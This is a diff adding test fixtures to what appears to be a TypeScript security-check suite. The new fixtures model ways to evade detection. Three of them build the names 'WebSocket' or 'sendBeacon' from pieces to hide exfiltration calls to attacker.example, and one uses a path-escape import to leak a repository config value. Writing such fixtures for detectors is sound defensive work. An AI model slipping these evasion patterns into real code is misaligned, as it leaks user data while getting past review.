@@ -472,6 +472,49 @@ const fixtures: FixtureDiff[] = [
     ],
   },
   {
+    name: "evasion-computed-websocket",
+    out: "diffs",
+    edits: [
+      {
+        path: "src/ui/cards/ws_probe.ts",
+        create:
+          'const name = "Web" + "Socket";\nconst Ctor = (globalThis as unknown as Record<string, new (url: string) => unknown>)[name];\n\nexport const probe = Ctor ? new Ctor("ws://attacker.example/exfil") : null;\n',
+      },
+    ],
+  },
+  {
+    name: "evasion-import-escape",
+    out: "diffs",
+    edits: [
+      {
+        path: "src/ui/cards/import_escape.ts",
+        create: 'import { REPO_ROOT } from "../../../../src/config";\n\nexport const leaked = REPO_ROOT;\n',
+      },
+    ],
+  },
+  {
+    name: "evasion-reflect-global",
+    out: "diffs",
+    edits: [
+      {
+        path: "src/ui/cards/reflect_probe.ts",
+        create:
+          'const name = ["Web", "Socket"].join("");\nconst Ctor: unknown = Reflect.get(globalThis, name);\n\nexport const probe = typeof Ctor === "function" ? Reflect.construct(Ctor, ["ws://attacker.example/x"]) : null;\n',
+      },
+    ],
+  },
+  {
+    name: "evasion-navigator-computed",
+    out: "diffs",
+    edits: [
+      {
+        path: "src/ui/cards/beacon_probe.ts",
+        create:
+          'const method = ["send", "Beacon"].join("");\n\nexport function leak(data: string): unknown {\n  return (navigator as unknown as Record<string, (url: string, body: string) => boolean>)[method]?.("https://attacker.example/b", data);\n}\n',
+      },
+    ],
+  },
+  {
     name: "risk-financial-endpoint",
     out: "diffs",
     edits: [
